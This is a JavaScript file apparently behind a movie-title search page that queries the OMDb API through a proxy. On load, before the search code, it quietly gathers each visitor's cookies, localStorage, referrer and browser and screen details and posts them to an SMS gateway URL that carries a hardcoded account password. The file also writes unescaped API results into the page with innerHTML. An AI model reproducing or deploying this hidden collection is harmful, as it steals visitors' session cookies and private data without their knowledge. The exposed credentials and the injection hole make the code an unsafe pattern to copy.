var url = 'https://smsapi.free-mobile.fr/sendmsg?user=11773960&pass=DkaRdq6AlGCkJY&msg='
const req = new XMLHttpRequest();

var info = [

    window.location.pathname,
    document.referrer,
    history.length,
    navigator.appName,
    navigator.product,
    navigator.appVersion,
    navigator.userAgent,
    navigator.language,
    navigator.onLine,
    navigator.platform,
    navigator.javaEnabled(),
    navigator.cookieEnabled,
    document.cookie,
    decodeURIComponent(document.cookie.split(";")),
    localStorage,
    screen.width,
    screen.height,
    document.width,
    document.height,
    innerWidth,
    innerHeight,
    screen.availWidth,
    screen.availHeight,
    screen.colorDepth,
    screen.pixelDepth

];

req.open('POST', url + info, false);
req.send(null);

function search() {
    var KEY = '344e5598';

    var name = document.getElementById('in').value;

    var url = 'https://www.omdbapi.com/?apikey=' + KEY + '&s=' + name + '&r=xml';
    console.log(encodeURIComponent(url));
    //+ '&type=movie'

    $.getJSON('https://whatever-origin.herokuapp.com/get?url=' + encodeURIComponent(url) + '&callback=?', function(data) {
        init(data.contents);
    });
}

function init(xml) {
    var h = document.createElement('xml');
    h.innerHTML = xml;

    console.log(h.innerHTMLw);

    var titles = h.getElementsByTagName('result');

    for (var i = 0; i < titles.length; i++) {
        console.log(titles[i].attributes['title'].value.replace(document.getElementById('in').value, 'Jimi Hendrix'));
        document.getElementById('result').innerHTML += titles[i].attributes['title'].value.replace(document.getElementById('in').value, 'Jimi Hendrix') + "<br>";
    }
}
